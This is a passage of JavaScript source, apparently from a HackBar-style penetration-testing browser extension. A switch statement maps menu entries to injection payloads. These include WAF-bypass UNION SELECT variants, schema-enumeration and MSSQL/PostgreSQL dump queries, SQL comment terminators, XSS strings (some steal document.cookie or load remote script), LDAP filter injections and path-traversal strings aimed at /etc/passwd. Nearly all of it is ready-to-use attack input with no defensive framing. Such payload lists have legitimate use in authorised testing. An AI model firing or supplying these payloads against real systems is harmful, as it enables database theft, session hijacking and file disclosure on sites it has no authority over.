            case 'UNION7': txt = "/*!%55NiOn*/ /*!%53eLEct*/";
					break;

            case 'UNION8': txt = "+un/**/ion+se/**/lect";
					break;

            case 'UNION9': txt = "UNION/*&test=1*/SELECT/*&pwn=2*/";
					break;

            case 'UNION10': txt = "+?UnI?On?+'SeL?ECT?";
					break;

            case 'UNION11': txt = "+(UnIoN)+(SelECT)+";
					break;
 
            case 'UNION12': txt = "+(UnI)(oN)+(SeL)(EcT)";
					break;

            case 'UNION13': txt = "+UnIoN/*&a=*/SeLeCT/*&a=*/";
					break;

            case 'UNION14': txt = "+uni>on+sel>ect+";
					break;
					
					
			case 'UNION15': txt = "%55nion(%53elect 1,2,3)-- -";
					break;
			case 'UNION16': txt = "/**//*!12345UNION SELECT*//**/";
					break;
            case 'UNION17': txt = "/**//*!50000UNION SELECT*//**/";
					break;
            case 'UNION18': txt = "/**/UNION/**//*!50000SELECT*//**/";
					break;	
			case 'UNION19': txt = "/*!50000UniON SeLeCt*/";
					break;	
			case 'UNION20': txt = "union /*!50000%53elect*/";
					break;

            case 'UNION21': txt = "+ #?uNiOn + #?sEleCt";
					break;
            case 'UNION22': txt = "+ #?1q %0AuNiOn all#qa%0A#%0AsEleCt";
					break;
            case 'UNION23': txt = "/*!%55NiOn*/ /*!%53eLEct*/";
					break;	
			case 'UNION24': txt = "/*!u%6eion*/ /*!se%6cect*/";
					break;	
			case 'UNION25': txt = "+un/**/ion+se/**/lect";
					break;
            case 'UNION26': txt = "uni%0bon+se%0blect";
					break;
            case 'UNION27': txt = "%2f**%2funion%2f**%2fselect";
					break;
            case 'UNION28': txt = "union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A";
					break;	
			case 'UNION29': txt = "REVERSE(noinu)+REVERSE(tceles)";
					break;	
			case 'UNION30': txt = "/*--*/union/*--*/select/*--*/";
					break;
            case 'UNION31': txt = "union (/*!/**/ SeleCT */ 1,2,3)";
					break;
            case 'UNION32': txt = "/*!union*/+/*!select*/";
					break;
            case 'UNION33': txt = "union+/*!select*/";
					break;	
			case 'UNION34': txt = "/**/union/**/select/**/";
					break;	
			case 'UNION35': txt = "/**/uNIon/**/sEleCt/**/";
					break;
            case 'UNION36': txt = "+%2F**/+Union/*!select*/";
					break;
            case 'UNION37': txt = "/**//*!union*//**//*!select*//**/";
					break;
            case 'UNION38': txt = "/*!uNIOn*/ /*!SelECt*/";
					break;	
			case 'UNION39': txt = "uNiOn aLl sElEcT";
					break;	
			case 'UNION40': txt = "UNIunionON+SELselectECT";
					break;					
            case 'UNION41': txt = "/**/union/*!50000select*//**/";
					break;
            case 'UNION42': txt = "0%a0union%a0select%09";
					break;
            case 'UNION43': txt = "%0Aunion%0Aselect%0A";
					break;	
			case 'UNION44': txt = "%55nion/**/%53elect";
					break;	
			case 'UNION45': txt = 'uni<on all="" sel="">/*!20000%0d%0aunion*/+/*!20000%0d%0aSelEct*/';
					break;
            case 'UNION46': txt = "%252f%252a*/UNION%252f%252a /SELECT%252f%252a*/";
					break;
            case 'UNION47': txt = "%0A%09UNION%0CSELECT%10NULL%";
					break;
            case 'UNION48': txt = "/*!union*//*--*//*!all*//*--*//*!select*/";
					break;	
			case 'UNION49': txt = "union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A1% 2C2%2C";
					break;	
			case 'UNION50': txt = "/*!20000%0d%0aunion*/+/*!20000%0d%0aSelEct*/";
					break;
            case 'UNION51': txt = "+UnIoN/*&a=*/SeLeCT/*&a=*/";
					break;
            case 'UNION52': txt = "union+sel%0bect";
					break;
            case 'UNION53': txt = "+uni*on+sel*ect+";
					break;	
			case 'UNION54': txt = "+#1q%0Aunion all#qa%0A#%0Aselect";
					break;	
			case 'UNION55': txt = "union(select (1),(2),(3),(4),(5))";
					break;
            case 'UNION56': txt = "UNION(SELECT(column)FROM(table))";
					break;
            case 'UNION57': txt = "%23xyz%0AUnIOn%23xyz%0ASeLecT+";
					break;
            case 'UNION58': txt = "%23xyz%0A%55nIOn%23xyz%0A%53eLecT+";
					break;	
			case 'UNION59': txt = "union(select(1),2,3)";
					break;	
			case 'UNION60': txt = "union (select 1111,2222,3333)";
					break;
            case 'UNION61': txt = "uNioN (/*!/**/ SeleCT */ 11)";
					break;
            case 'UNION62': txt = "union (select 1111,2222,3333)";
					break;
            case 'UNION63': txt = "+#1q%0AuNiOn all#qa%0A#%0AsEleCt";
					break;	
			case 'UNION64': txt = "/**//*U*//*n*//*I*//*o*//*N*//*S*//*e*//*L*//*e*//*c*//*T*/";
					break;	
			case 'UNION65': txt = "%0A/**//*!50000%55nIOn*//*yoyu*/all/**/%0A/*!%53eLEct*/%0A/*nnaa*/";
					break;
            case 'UNION66': txt = "+%23sexsexsex%0AUnIOn%23sexsexs ex%0ASeLecT+";
					break;
            case 'UNION67': txt = "+union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A1% 2C2%2C";
					break;
            case 'UNION68': txt = "/*!f****U%0d%0aunion*/+/*!f****U%0d%0aSelEct*/";
					break;	
			case 'UNION69': txt = "+%23blobblobblob%0aUnIOn%23blobblobblob%0aSeLe cT+";
					break;	
			case 'UNION70': txt = "/*!blobblobblob%0d%0aunion*/+/*!blobblobblob%0d%0aSelEct*/";
					break;
            case 'UNION71': txt = "/union\\sselect/g";
					break;
            case 'UNION72': txt = "/union\\s+select/i";
					break;
            case 'UNION73': txt = "/*!UnIoN*/SeLeCT";
					break;	
			case 'UNION74': txt = "+UnIoN/*&a=*/SeLeCT/*&a=*/";
					break;	
			case 'UNION75': txt = "+uni>on+sel>ect+";
					break;
            case 'UNION76': txt = "+(UnIoN)+(SelECT)+";
					break;
            case 'UNION77': txt = "+(UnI)(oN)+(SeL)(EcT)";
					break;
            case 'UNION78': txt = "+?UnI?On?+'SeL?ECT?";
					break;	
			case 'UNION79': txt = "+uni on+sel ect+";
					break;	
			case 'UNION80': txt = "+/*!UnIoN*/+/*!SeLeCt*/+";
					break;
            case 'UNION81': txt = "/*!u%6eion*/ /*!se%6cect*/";
					break;
            case 'UNION82': txt = "uni%20union%20/*!select*/%20";
					break;
            case 'UNION83': txt = "union%23aa%0Aselect";
					break;	
			case 'UNION84': txt = "/**/union/*!50000select*/";
					break;	
			case 'UNION85': txt = "/^****union.*$/ /^****select.*$/";
					break;
            case 'UNION86': txt = "/*union*/union/*select*/select+";
					break;
            case 'UNION87': txt = "/*uni X on*/union/*sel X ect*/";
					break;
            case 'UNION88': txt = "+un/**/ion+sel/**/ect+";
					break;	
			case 'UNION89': txt = "+UnIOn%0d%0aSeleCt%0d%0a";
					break;	
			case 'UNION90': txt = "UNION/*&test=1*/SELECT/*&pwn=2*/";
					break;
            case 'UNION91': txt = 'un?<ion sel="">+un/**/ion+se/**/lect+';
					break;
            case 'UNION92': txt = "+UNunionION+SEselectLECT+";
					break;
            case 'UNION93': txt = "+uni%0bon+se%0blect+";
					break;	
			case 'UNION94': txt = "%252f%252a*/union%252f%252a /select%252f%252a*/";
					break;	
			case 'UNION95': txt = "/%2A%2A/union/%2A%2A/select/%2A%2A/";
					break;
            case 'UNION96': txt = "%2f**%2funion%2f**%2fselect%2f**%2f";
					break;
            case 'UNION97': txt = "union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A";
					break;
            case 'UNION98': txt = "/*!UnIoN*/SeLecT+";
					break;	
			case 'UNION99': txt = "/*!50000UnION*//*!50000SeLeCt*/";
					break;		
			case 'UNION100': txt = "')AnD null UNiON SeLeCt 1,2,3,4,5;%00";
					break;	
			case 'UNION101': txt = "')AnD null UNiON SeLeCt 1,2,3,4,5+--+";
					break;
			case 'UNION102': txt = "' And True Union Select 1,2,3;%00";
					break;
			case 'UNION103': txt = "' And False Union Select 1,2,3;%00";
					break;
			case 'UNION104': txt = "' And True Union Select 1,2,3+--+";
					break;
			case 'UNION105': txt = "' And False Union Select 1,2,3+--+";
					break;

//WAF BASED/CONCAT

			case 'CONCAT1': txt = "CoNcAt()";
					break;

            case 'CONCAT2': txt = "CON%08CAT()";
					break;

            case 'CONCAT3': txt = "%0AcOnCat()";
					break;

            case 'CONCAT4': txt = "/**//*!12345cOnCat*/";
					break;

            case 'CONCAT5': txt = "/*!50000cOnCat*/(/*!*/)";
					break;

            case 'CONCAT6': txt = "unhex(hex(concat(table_name)))";
					break;

            case 'CONCAT7': txt = "unhex(hex(/*!12345concat*/(table_name)))";
					break;

            case 'CONCAT8': txt = "unhex(hex(/*!50000concat*/(table_name)))";
					break;

//Group Concat

			case 'group_concat 1': txt = '/*!group_concat*/()';
					break;

			case 'group_concat 2': txt = 'gRoUp_cOnCAt()';
					break;

			case 'group_concat 3': txt = 'group_concat(/*!*/)';
					break;

			case 'group_concat 4': txt = 'group_concat(/*!12345table_name*/)';
					break;

			case 'group_concat 5': txt = 'group_concat(/*!50000table_name*/)';
					break;

			case 'group_concat 6': txt = '/*!group_concat*/(/*!12345table_name*/)';
					break;

			case 'group_concat 7': txt = '/*!group_concat*/(/*!50000table_name*/)';
					break;

			case 'group_concat 8': txt = '/*!12345group_concat*/(/*!12345table_name*/)';
					break;

			case 'group_concat 9': txt = '/*!50000group_concat*/(/*!50000table_name*/)';
					break;

			case 'group_concat 10': txt = '/*!GrOuP_ConCaT*/()';
					break;

			case 'group_concat 11': txt = '/*!12345GroUP_ConCat*/()';
					break;

			case 'group_concat 12': txt = '/*!50000gRouP_cOnCaT*/()';
					break;

			case 'group_concat 13': txt = '/*!50000Gr%6fuP_c%6fnCAT*/()';
					break;

			case 'group_concat 14': txt = 'unhex(hex(group_concat(table_name)))';
					break;

			case 'group_concat 15': txt = 'unhex(hex(/*!group_concat*/(/*!table_name*/)))';
					break;

			case 'group_concat 16': txt = 'unhex(hex(/*!12345group_concat*/(table_name)))';
					break;

			case 'group_concat 17': txt = 'unhex(hex(/*!12345group_concat*/(/*!table_name*/)))';
					break;

			case 'group_concat 18': txt = 'unhex(hex(/*!12345group_concat*/(/*!12345table_name*/)))';
					break;

			case 'group_concat 19': txt = 'unhex(hex(/*!50000group_concat*/(table_name)))';
					break;

			case 'group_concat 20': txt = 'unhex(hex(/*!50000group_concat*/(/*!table_name*/)))';
					break;

			case 'group_concat 21': txt = 'unhex(hex(/*!50000group_concat*/(/*!50000table_name*/)))';
					break;

			case 'group_concat 22': txt = 'convert(group_concat(table_name)+using+ascii)';
					break;

			case 'group_concat 23': txt = 'convert(group_concat(/*!table_name*/)+using+ascii)';
					break;

			case 'group_concat 24': txt = 'convert(group_concat(/*!12345table_name*/)+using+ascii)';
					break;

			case 'group_concat 25': txt = 'convert(group_concat(/*!50000table_name*/)+using+ascii)';
					break;

			case 'group_concat 26': txt = 'CONVERT(group_concat(table_name)+USING+latin1)';
					break;

			case 'group_concat 27': txt = 'CONVERT(group_concat(table_name)+USING+latin2)';
					break;

			case 'group_concat 28': txt = 'CONVERT(group_concat(table_name)+USING+latin3)';
					break;

			case 'group_concat 29': txt = 'CONVERT(group_concat(table_name)+USING+latin4)';
					break;

			case 'group_concat 30': txt = 'CONVERT(group_concat(table_name)+USING+latin5)';
					break;

//WAF BASED/ NUMBER

			case 'NUMBER1': txt = "+div+0";
					break;

            case 'NUMBER2': txt = "+div false+";
					break;

            case 'NUMBER3': txt = "+Having+1=0+";
					break;

            case 'NUMBER4': txt = "+Having false+";
					break;

            case 'NUMBER5': txt = "+and false+";
					break;

            case 'NUMBER6': txt = "+and null+";
					break;

            case 'NUMBER7': txt = "+AND+1=0+";
					break;

            case 'NUMBER8': txt = "+and+(1)=(0)+";
					break;

            case 'NUMBER9': txt = "+and+(1)!=(0)+";
					break;

            case 'NUMBER10': txt = "+and+2>3+";
					break;

            case 'NUMBER11': txt = "%26%26 null";
					break;

			//calculation statement

			case 'or 1': txt = "or 1=1";
					break;

			case 'or 2': txt = "or 0=0";
					break;

			case 'or 3': txt = "or 25-10-5=5";
					break;

			case 'or 4': txt = "or 20-5-5=10";
					break;

			case 'or 5': txt = "or 25-5-5=15";
					break;

			case 'or 6': txt = "or 5*5*1=25";
					break;

			case 'or 7': txt = "or 10+10+5=30";
					break;

			case 'or 8': txt = "Or 1 Less Than 0";
					break;

			//MOD WAF
			case 'mod 1': txt = "and point(29,9)";
						break;

	        case 'mod 2': txt = "and mod(9,4)";
						break;

	        case 'mod 3': txt = "and power(5,5)";
						break;

	        case 'mod 4': txt = "and Radians(point(53,12))";
						break;

	        case 'mod 5': txt = "and polygon(point(53,12))";
						break;

	        case 'mod 6': txt = "Multipolygon(point(53,12))";
						break;

	        case 'mod 7': txt = "Linestring(point(53,12))";
						break;

	        case 'mod 8': txt = "Multilinestring(point(53,12))";
						break;

	        case 'mod 9': txt = "Geometrycollection(point(53,12))";
						break;

//WAF BASED/ SCHEMA


            case 'SCHEMA1': txt = "/*!froM*/ /*!InfORmaTion_scHema*/.tAblES /*!WhERe*/ /*!TaBle_ScHEmA*/=schEMA()-- -";
					break;

            case 'SCHEMA2': txt = "/*!froM*/ /*!InfORmaTion_scHema*/.tAblES /*!WhERe*/ /*!TaBle_ScHEmA*/ like schEMA()-- -";
					break;

            case 'SCHEMA3': txt = "/*!froM*/ /*!InfORmaTion_scHema*/.tAblES /*!WhERe*/ /*!TaBle_ScHEmA*/=database()-- -";
					break;

            case 'SCHEMA4': txt = "/*!froM*/ /*!InfORmaTion_scHema*/.tAblES /*!WhERe*/ /*!TaBle_ScHEmA*/ like database()-- -";
					break;

            case 'SCHEMA5': txt = "/*!FrOm*/+%69nformation_schema./**/columns+/*!50000Where*/+/*!%54able_name*/=hex table/*!FrOm*/+information_schema./**/columns+/*!12345Where*/+/*!%54able_name*/ like hex table";
					break;

            case 'SCHEMA6': txt = "/*!50000frOm*/+/*!50000information_schema*/%252e/**/columns";
            		break;

//WAF BASED/ FIX POINT

            case 'FIX POINT1': txt = "--";
				break;
			case 'FIX POINT2': txt = "-- -";
				break;
			case 'FIX POINT3': txt = "--+-";
				break;
			case 'FIX POINT4': txt = ")--";
				break;
			case 'FIX POINT5': txt = ")-- -";
				break;
			case 'FIX POINT6': txt = ")--+-";
				break;
			case 'FIX POINT7': txt = "))--";
				break;
			case 'FIX POINT8': txt = "))-- -";
				break;
			case 'FIX POINT9': txt = "))--+-";
				break;
			case 'FIX POINT10': txt = ";%00";
				break;
			case 'FIX POINT11': txt = ") ;%00";
				break;
			case 'FIX POINT12': txt = "));%00";
				break;
			case 'FIX POINT13': txt = "%23";
				break;
			case 'FIX POINT14': txt = "%60";
				break;
			case 'FIX POINT15': txt = "%90";
				break;
			case 'FIX POINT16': txt = "and 1=1";
				break;
			case 'FIX POINT17': txt = "and '1'='1";
				break;
			case 'FIX POINT18': txt = "and (1)=(1 ";
				break;
			case 'FIX POINT19': txt = "php?id=(1) -- -";
				break;
			case 'FIX POINT20': txt = "'--+-";
				break;
			case 'FIX POINT21': txt = "')-- -";
				break;
			case 'FIX POINT22': txt = "')--+-";
				break;
			case 'FIX POINT23': txt = "'))-- -";
				break;
			case 'FIX POINT24': txt = "'))--+-";
				break;
			case 'FIX POINT25': txt = "';%00";
				break;
			case 'FIX POINT26': txt = "');%00";
				break;
			case 'FIX POINT27': txt = "'));%00";
				break;
			case 'FIX POINT28': txt = "'%23";
				break;
			case 'FIX POINT29': txt = "'%60";
				break;
			case 'FIX POINT30': txt = "'%90";
				break;
			case 'FIX POINT31': txt = "' and 1=1";
				break;
			case 'FIX POINT32': txt = "' and '1'='1";
				break;
			case 'FIX POINT33': txt = "' and (1)=(1 ";
				break;
			case 'FIX POINT34': txt = "php?id=(1') -- -";
				break;
			case 'FIX POINT35': txt = "\"-- -";
				break;
			case 'FIX POINT36': txt = "\"--+-";
				break;
			case 'FIX POINT37': txt = "\"%23";
				break;
			case 'FIX POINT38': txt = "\")-- -";
				break;
			case 'FIX POINT39': txt = "\")--+-";
				break;
			case 'FIX POINT40': txt = "\"))--+-";
				break;
			case 'FIX POINT41': txt = "\";%00";
				break;
			case 'FIX POINT42': txt = "\") ;%00";
				break;
			case 'FIX POINT43': txt = "\"));%00";
				break;
			case 'FIX POINT44': txt = "\"%60";
				break;
			case 'FIX POINT45': txt = "\"%90";
				break;
			case 'FIX POINT46': txt = "\" and 1=1";
				break;
			case 'FIX POINT47': txt = "\" and '1'='1";
				break;
			case 'FIX POINT48': txt = "\" and (1)=(1 ";
				break;
			case 'FIX POINT49': txt = "php?id=(1\") -- -";
				break;
				
			//FIX TAB 2
			//case 'FIX POINT50': txt = "and x(point(0,0)) -- -";
			//	break;
			case 'FIX POINT50': txt = "/*";
				break;
			case 'FIX POINT51': txt = "--/*";
				break;
			case 'FIX POINT52': txt = "\\--+";
					break;
			case 'FIX POINT53': txt = "\\-- +";
					break;
			case 'FIX POINT54': txt = "#--+";
					break;
			case 'FIX POINT55': txt = "#-- -";
					break;	
            case 'FIX POINT56': txt = "--++";
					break;
			case 'FIX POINT57': txt = "+--+";
					break;	
			case 'FIX POINT58': txt = "'))%23";
					break;
			case 'FIX POINT59': txt = "a'))%60";
					break;
			case 'FIX POINT60': txt = "'));%00";
					break;
			case 'FIX POINT61': txt = "');%00";
					break;	
			case 'FIX POINT62': txt = "')order by 10;%00";
					break;
					
			//FIX TAB 3
            case 'FIX POINT63': txt = "AND'1";
					break;
			case 'FIX POINT64': txt = "or'1";
					break;
			case 'FIX POINT65': txt = "AND1='1";
					break;
            case 'FIX POINT66': txt = "and 1=0";
					break;
			case 'FIX POINT67': txt = "') and true";
					break;
			case 'FIX POINT68': txt = "') and false";
					break;	
			case 'FIX POINT69': txt = "') or true";
					break;	
			case 'FIX POINT70': txt = "') or false";
					break;
			case 'FIX POINT71': txt = "' and true";
					break;
			case 'FIX POINT72': txt = "' and false";
					break;
			case 'FIX POINT73': txt = "' or true";
					break;	
			case 'FIX POINT74': txt = "' or false";
					break;
			case 'FIX POINT75': txt = "and x(point(0,0)) -- -";
				break;

			//Brute xss 
                         
            case 'brutexss1': txt = "<svg/onload=alert()>";
					break;
            
			case 'brutexss2': txt = '"><svg/onload=alert()>';
					break;

            case 'brutexss3': txt = "?><script>alert(?X?)</script>";
					break;

            case 'brutexss4': txt = "</ScrIpt><script>alert(1)</script>";
					break;

            case 'brutexss5': txt = '"><script>alert(1)</script>';
					break;

            case 'brutexss6': txt = '" onerror=alert(1) "';
					break;

            case 'brutexss7': txt = '" onerror=alert(1) x="';
					break;

            case 'brutexss8': txt = "-alert(1)-";
					break;
                        
            case 'brutexss9': txt = "-prompt(1)-";
					break;

            case 'brutexss10': txt = '<SCRIPT>+alert("X");</SCRIPT>';
					break;

            case 'brutexss11': txt = '<svg><script>varmyvar="text&quot;;alert(1)//";</script></svg>';
					break;

            case 'brutexss12': txt = "'><x onload'=alert(1)";
					break;
            
			case 'brutexss13': txt = "alert(/XSS/);";
					break;

            case 'brutexss14': txt = "1;alert(/XSS/);";
					break;

            case 'brutexss15': txt = "1';alert(/XSS/);x='1";
					break;

            case 'brutexss16': txt = "this['alert'](1)";
					break;

            case 'brutexss17': txt = '"-alert(1)-"';
					break;

            case 'brutexss18': txt = '"/alert(1)/"';
					break;
                        
            case 'brutexss19': txt = '"|alert(1)|"';
					break;

            case 'brutexss20': txt = "==alert(1)==";
					break;

            case 'brutexss21': txt = "[alert(1)]+";
					break;

            case 'brutexss22': txt = "^alert(1)^";
					break;

            case 'brutexss23': txt = "|alert(1)|";
					break;

            case 'brutexss24': txt = "&alert(1)&";
					break;

            case 'brutexss25': txt = ">>alert(1)>>";
					break;

            case 'brutexss26': txt = "'|\\u0061lert()|'";
					break;

            case 'brutexss27': txt = "\\\";alert('X');//";
					break;
                        
            case 'brutexss28': txt = "&#x00027;; confirm(1); &#x00027;";
					break;

            case 'brutexss29': txt = "&#39;; confirm(1); &#39;";
					break;

            case 'brutexss30': txt = "%27; confirm(1); %27";
					break;

            case 'brutexss31': txt = "'; confirm(1); '";
					break;
              


//LDAP FUZZ
              

        case 'Ldap1': txt = "*";
					break;
					
        case 'Ldap2': txt = "*)(&";
					break;

        case 'Ldap3': txt = "*))%26'";
					break;

        case 'Ldap4': txt = "*()|&'";
					break;

        case 'Ldap5': txt = "*(|(mail=*))";
					break;

        case 'Ldap6': txt = "*(|(objectclass=*))";
					break;

        case 'Ldap7': txt = "*)(uid=*))(|(uid=*";
					break;

        case 'Ldap8': txt = "*/*";
					break;
                       
		case 'Ldap9': txt = "*|";
					break;

        case 'Ldap10': txt = "//*";
					break;

        case 'Ldap11': txt = "@*";
					break;

        case 'Ldap12': txt = "admin*";
					break;

        case 'Ldap13': txt = "admin*)((|userpassword=*)";
					break;

        case 'Ldap14': txt = "x' or name()='username' or 'x'='y";
					break;

        case 'Ldap15': txt = "%2A%28%7C%28mail%3D%2A%29%29";
					break;
        
		case 'Ldap16': txt = "*(|(mail=*))";
					break;

        case 'Ldap17': txt = "*(|(objectclass=*))";
					break;

        case 'Ldap18': txt = "x' or name()='username' or 'x'='y";
					break;

        case 'Ldap19': txt = "admin*)((|userpassword=*)";
					break;

        case 'Ldap20': txt = "*)(uid=*))(|(uid=*";
					break;

        case 'Ldap21': txt = "%2A%28%7C%28objectclass%3D%2A%29%29";
					break;
                      
		case 'Ldap22': txt = "%2A%7C";
					break;

        case 'Ldap23': txt = "%7C";
					break;



//UNION BASED MENU	/ COLUMN COUNT


			case 'Column count0': txt = "order by 1";
					break;	
			case 'Column count1': txt = "+ORDER+BY+1";
					break;
			case 'Column count02':
                    var columns = 100;
                    columns = Math.min(1000, parseInt( columns ));
                    var colArray = new Array();
                    for ( var i = 0 ; i < columns ; i++ ) {
                      colArray.push( i+1 );
                    }
                    txt = "GROUP BY " + colArray.join( ',' );
                    break;		
			case 'Column count2':
                    var columns = 100;
                    columns = Math.min(1000, parseInt( columns ));
                    var colArray = new Array();
                    for ( var i = 0 ; i < columns ; i++ ) {
                      colArray.push( i+1 );
                    }
                    txt = "+GROUP+BY+" + colArray.join( ',' );
                    break;		
			case 'Column count3': txt = "+PROCEDURE+ANALYSE()";
					break;
			case 'Column count4': var txt = hackBar.getSelectedText();
					txt = "'+AND+(SELECT * FROM " + txt + ")=(SELECT 1)--+";
					break;

/*PostgreSQL DIOS*/
			case 'PostgreSQL1':
						txt = "(select+array_to_string(array_agg(concat(table_name,'::',column_name)::text),$$%3Cli%3E$$)from+information_schema.columns+where+table_schema+not+in($$information_schema$$,$$pg_catalog$$))";
					break;
			case 'PostgreSQL2':
						txt = "(select+string_agg(concat(table_name,'::',column_name),$$%3Cli%3E$$)from+information_schema.columns+where+table_schema+not+in($$information_schema$$,$$pg_catalog$$))";
					break;
			case 'PostgreSQL3':
						txt = "(select+array_to_string(array(select+table_name||':::'||column_name::text+from+information_schema.columns+where+table_schema+not+in($$information_schema$$,$$pg_catalog$$)),'%3Cli%3E'))";
					break;
 /*MSSQL DIOS*/
			case 'MSSQL1':
						txt = ";begin declare @x varchar(8000), @y int, @z varchar(50), @a varchar(100) declare @myTbl table (name varchar(8000) not null) SET @y=1 SET @x='injected by rummykhan :: '%2b@@version%2b CHAR(60)%2bCHAR(98)%2bCHAR(114)%2bCHAR(62)%2b'Database : '%2bdb_name()%2b CHAR(60)%2bCHAR(98)%2bCHAR(114)%2bCHAR(62) SET @z='' SET @a='' WHILE @y<=(SELECT COUNT(table_name) from INFORMATION_SCHEMA.TABLES) begin SET @a='' Select @z=table_name from INFORMATION_SCHEMA.TABLES where TABLE_NAME not in (select name from @myTbl) select @a=@a %2b column_name%2b' : ' from INFORMATION_SCHEMA.COLUMNS where TABLE_NAME=@z insert @myTbl values(@z) SET @x=@x %2b  CHAR(60)%2bCHAR(98)%2bCHAR(114)%2bCHAR(62)%2b'Table: '%2b@z%2b CHAR(60)%2bCHAR(98)%2bCHAR(114)%2bCHAR(62)%2b'Columns : '%2b@a%2b CHAR(60)%2bCHAR(98)%2bCHAR(114)%2bCHAR(62) SET @y = @y%2b1 end select @x as output into Chall1 END--";
					break;
/*XSS Payoads by r0ot*/
			case 'xss1':
						txt = "<script>alert(1);</script>";
					break;
			case 'xss2':
						txt = "<script>alert('XSS');</script>";
					break;
			case 'xss3':
						txt = "<IMG SRC=javascript:alert(&quot;XSS&quot;)>";
					break;
			case 'xss4':
						txt = "<IMG SRC=javascript:alert('XSS')>";
					break;
			case 'xss5':
						txt = "<scr<script>ipt>alert('XSS');</scr</script>ipt>";
					break;
			case 'xss6':
						txt = "'><script>alert(0)</script>";
					break;
			case 'xss7':
						txt = "<img src=foo.png onerror=alert(/xssed/) />";
					break;
			case 'xss8':
						txt = "<style>@im\\port'\\ja\\vasc\\ript:alert(\\\"XSS\\\")';</style>";
					break;
			case 'xss9':
						txt = "<? echo('<scr)'; echo('ipt>alert(\\\"XSS\\\")</script>'); ?>";
					break;
			case 'xss10':
						txt = "<marquee><script>alert('XSS')</script></marquee>";
					break;
			case 'xss11':
						txt = "<IMG SRC=\\\"jav&#x09;ascript:alert('XSS');\\\">";
					break;
			case 'xss12':
						txt = "<IMG SRC=\\\"jav&#x0A;ascript:alert('XSS');\\\">";
					break;
			case 'xss13':
						txt = "<IMG SRC=\\\"jav&#x0D;ascript:alert('XSS');\\\">";
					break;
			case 'xss14':
						txt = "<script src=http://yoursite.com/your_files.js></script>";
					break;
			case 'xss15':
						txt = "</title><script>alert(/xss/)</script>";
					break;
			case 'xss16':
						txt = "</textarea><script>alert(/xss/)</script>";
					break;
			case 'xss17':
						txt = "<IMG LOWSRC=\\\"javascript:alert('XSS')\\\">";
					break;
			case 'xss18':
						txt = "<IMG DYNSRC=\\\"javascript:alert('XSS')\\\">";
					break;
			case 'xss19':
						txt = "<font style='color:expression(alert(document.cookie))'>";
					break;
			case 'xss20':
						txt = "<img src=javascript:alert('XSS')>";
					break;
			case 'xss21':
						txt = "<script language=JavaScript>alert('XSS')</script>";
					break;
			case 'xss22':
						txt = "<body onunload=javascript:alert('XSS');>";
					break;
			case 'xss23':
						txt = "<body onLoad='alert('XSS');'";
					break;
			case 'xss24':
						txt = "[color=red' onmouseover='alert('xss')']mouse over[/color]";
					break;
			case 'xss25':
						txt = "'/></a></><img src=1.gif onerror=alert(1)>";
					break;
			case 'xss26':
						txt = "window.alert('Bonjour !');";
					break;
			case 'xss27':
						txt = "<div style='x:expression((window.r==1)?'':eval('r=1;";
					break;
			case 'xss28':
						txt = "<iframe<?php echo chr(11)?> onload=alert('XSS')></iframe>";
					break;
			case 'xss29':
						txt = "'>><marquee><h1>XSS</h1></marquee>";
					break;
			case 'xss30':
						txt = "<META HTTP-EQUIV=\\\"refresh\\\" CONTENT=\\\"0;url=javascript:alert('XSS');\\\">";
					break;
			case 'xss31':
						txt = "<META HTTP-EQUIV=\\\"refresh\\\" CONTENT=\\\"0; URL=http://;URL=javascript:alert('XSS');\\\">";
					break;
			case 'xss32':
						txt = "<script>var var = 1; alert(var)</script>";
					break;
			case 'xss33':
						txt = "<STYLE type='text/css'>BODY{background:url('javascript:alert('XSS')')}</STYLE>";
					break;
			case 'xss34':
						txt = "<?='<SCRIPT>alert('XSS')</SCRIPT>'?>";
					break;
			case 'xss35':
						txt = "<IMG SRC='vbscript:msgbox(\\\"XSS\\\")'>";
					break;
			case 'xss36':
						txt = "' onfocus=alert(document.domain) '> <'";
					break;
			case 'xss37':
						txt = "<FRAMESET><FRAME SRC=\\\"javascript:alert('XSS');\\\"></FRAMESET>";
					break;
			case 'xss38':
						txt = "<STYLE>li {list-style-image: url(\\\"javascript:alert('XSS')\\\");}</STYLE><UL><LI>XSS";
					break;
			case 'xss39':
						txt = "[color=red width=expression(alert(123))][color]";
					break;
			case 'xss40':
						txt = "<BASE HREF='javascript:alert('XSS');//'>";
					break;
			case 'xss41':
						txt = "<br size=\\\"&{alert('XSS')}\\\">";
					break;
			case 'xss42':
						txt = "<scrscriptipt>alert(1)</scrscriptipt>";
					break;
			case 'xss43':
						txt = "</br style=a:expression(alert())>";
					break;
			case 'xss44':
						txt = "</script><script>alert(1)</script>";
					break;
			case 'xss45':
						txt = "'><BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert('XSS')>";
					break;
			case 'xss46':
						txt = "Execute(MsgBox(chr(88)&chr(83)&chr(83)))<";
					break;
			case 'xss47':
						txt = "<body onLoad='while(true) alert('XSS');'>";
					break;
			case 'xss48':
						txt = "''></title><script>alert(1111)</script>";
					break;
			case 'xss49':
						txt = "</textarea>''><script>alert(document.cookie)</script>";
					break;
			case 'xss50':
						txt = "data:text/html;charset=utf-7;base64,Ij48L3RpdGxlPjxzY3JpcHQ+YWxlcnQoMTMzNyk8L3NjcmlwdD4=";
					break;
// LFI 601-657
			
			
			case 'lfi601':
						txt = "/etc/passwd";
					break;
			case 'lfi602':
						txt = "///etc/passwd";
					break;
			case 'lfi603':
						txt = "../../../../../../../../../../../../etc/passwd";
					break;
			case 'lfi604':
						txt = "/etc/passwd%00";
					break;
			case 'lfi605':
						txt = "../../../../../../../../../../../../etc/passwd%00";
					break;
			case 'lfi606':
						txt = "\\\etc\\passwd";
					break;
			case 'lfi607':
						txt = "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd";
					break;
			case 'lfi608':
						txt = "\\etc\\passwd%00";
					break;
			case 'lfi609':
						txt = "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd%00";
					break;
			case 'lfi610':
						txt = "//etc/passwd";
					break;
			case 'lfi611':
						txt = "....//....//....//....//....//....//....//....//....//....//etc/passwd";
					break;
			case 'lfi612':
						txt = "//etc/passwd%00";
					break;
			case 'lfi613':
						txt = "....//....//....//....//....//....//....//....//....//....//etc/passwd%00";
					break;
			case 'lfi614':
						txt = "///etc/hosts";
					break;
			case 'lfi615':
						txt = "../../../../../../../../../../../../etc/hosts";
					break;
			case 'lfi616':
						txt = "/etc/hosts%00";
					break;
